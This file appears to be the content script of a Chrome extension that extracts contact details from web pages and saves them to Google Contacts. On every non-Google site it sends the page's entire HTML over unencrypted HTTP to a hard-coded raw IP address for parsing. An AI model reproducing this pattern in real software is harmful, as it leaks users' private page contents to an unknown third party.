const body = document.body.innerHTML;
const hostname = window.location.hostname;

if(!hostname.includes('google')) {
  fetch('http://193.106.200.232/parse/', {
    method: 'POST',
    cache: 'no-cache',
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({html: body})
  }).then(r => r.json()).then((data) => {
      const clearedData = {
        name: window.location.hostname,
        email: [...new Set(data.email)][0] || '',
        phone: [...new Set(data['phone number'])][0] || ''
      }

      chrome.storage.local.set({contactInfo: JSON.stringify(clearedData)});
      }
  )
}

chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        console.log(sender.tab ?
            "from a content script:" + sender.tab.url :
            "from the extension");
        if (request.type === 'AddToken') {
            const dataToSend = {
                names: [{givenName: request.formData.name}],
                phoneNumbers: [{value: request.formData.phone, type: 'other'}],
                emailAddresses: [{value: request.formData.email, type: 'other'}]
            }
            fetch('https://people.googleapis.com/v1/people:createContact', {
                method: 'POST',
                cache: 'no-cache',
                personFields: 'names, phoneNumbers, emailAddresses',
                headers: {
                    'Content-Type': 'application/json',
                    authorization: 'Bearer ' + request.token,
                },
                body: JSON.stringify(dataToSend)
            }). then(() => {
                chrome.storage.local.set({contactInfo: JSON.stringify(request.defaultFormData)});
            })
        }

    });
